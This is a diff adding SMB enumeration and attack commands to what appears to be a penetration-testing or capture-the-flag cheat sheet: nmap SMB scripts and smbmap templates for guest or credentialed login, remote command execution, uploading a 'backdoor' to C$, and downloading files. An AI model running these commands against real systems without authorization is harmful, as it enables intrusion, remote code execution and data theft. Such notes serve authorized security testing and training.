@@ -98,4 +98,22 @@ nmap -p [PORT] --script=smb-enum-groups --script-args smbsusername=[USERNAME],sm
 ```
 nmap -p [PORT] --script=smb-enum-services --script-args smbsusername=[USERNAME],smbpassword=[PASSWORD] [TARGET-IP]
 ```
+### SMB OS Discovery
+```
+nmap -p [PORT] --script smb-os-discovery [TARGET-IP]
+```
+### smbmap
+```
+smbmap -u [USERNAME] -p "[PASSWORD]" -d . -H [TARGET-IP]
+```
+```
+smbmap -u guest -p "" -d . -H [TARGET-IP]
+```
+```
+smbmap -u [USERNAME] -p "[PASSWORD]" -d . -H [TARGET-IP] -x [COMMAND-TO-RUN]
+```
+* -L to list drives
+* -r to look at contents: -r '[DRIVE-LETTER]'$ | Example: -r 'c$'
+* --upload '[FILE-PATH]' '[DESTINATION] | Example: --upload '/root/backdoor' 'C$\backdoor'
+* --download ['FILE-PATH] | Example: --download 'C$\flag.txt'
 
